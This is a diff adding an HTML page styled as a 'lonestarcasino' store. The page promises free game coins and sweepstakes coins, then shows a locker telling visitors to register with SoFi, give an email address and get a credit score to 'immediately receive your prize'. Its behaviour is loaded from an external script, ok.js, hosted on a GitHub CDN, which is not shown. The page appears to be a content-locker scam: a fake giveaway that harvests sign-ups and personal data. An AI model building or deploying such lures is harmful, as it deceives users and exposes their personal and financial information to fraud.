@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>lonestarcasino</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/monorolls/lone@main/ok.css" />
+</head>
+<body>
+
+<div id="mainUI">
+    <div class="store-modal">
+        <div class="store-header">STORE</div>
+        <div class="special-offer-container" onclick="handleAction()">
+            <div class="badge">Special Offer</div>
+            <div class="info-pill" style="width:200px; margin:5px auto;"><img src="https://cdn.jsdelivr.net/gh/monorolls/lone@main/LS-GCCoin.png"> 125,000 GC</div>
+            <div class="info-pill" style="width:200px; margin:5px auto;"><img src="https://cdn.jsdelivr.net/gh/monorolls/lone@main/LS-SCCoin.png"> 50 FREE SC</div>
+            <div class="price-button" style="width:150px; margin:10px auto;">FREE</div>
+            <div class="xp-row"><img src="https://cdn.jsdelivr.net/gh/monorolls/lone@main/exp-icon.png"> 250 XP</div>
+        </div>
+        <div class="packages-grid" id="packagesGrid"></div>
+    </div>
+</div>
+
+<div id="preloader-container">
+    <video id="preloader-video" muted playsinline>
+        <source src="https://cdn.jsdelivr.net/gh/monorolls/lone@main/preloader.mp4" type="video/mp4">
+    </video>
+</div>
+
+<div id="lockerArea">
+    <div id="my-locker-header"></div>
+    <div class="instruction-text">
+        <b>The final step</b><br><br>
+        Register to SoFi - Enter your email address - Check email confirm registration - Then Get your FREE credit score and get $10 - DONE<br><br>
+        After these steps are completed, you will immediately receive your prize.
+    </div>
+    <div id="offerContainer"></div>
+</div>
+<script id="coreLogic" src="https://cdn.jsdelivr.net/gh/monorolls/lone@main/ok.js" async></script>
+</body>
+</html>
